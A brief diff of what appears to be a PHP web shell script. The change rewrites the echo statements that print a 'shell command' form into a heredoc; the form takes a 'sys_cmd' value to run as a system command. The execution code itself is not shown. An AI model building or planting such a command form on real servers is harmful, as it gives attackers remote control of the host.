@@ -9,11 +9,13 @@
 
 
 // run system commands
-echo '<strong>shell command</strong><br><br>';
-echo '<form action="" method="post">';
-echo '  <input type="text" name="sys_cmd">';
-echo '  <input type="submit" name="sub_cmd" value="system cmd">';
-echo '</form>';
+echo <<<EOD
+<strong>shell command</strong><br><br>
+  <form action="" method="post">
+  <input type="text" name="sys_cmd">
+  <input type="submit" name="sub_cmd" value="system cmd">
+</form>
+EOD;
 
 echo '<pre>';
 $b64_regex = '#^[A-Za-z0-9+/]+={0,2}$#';
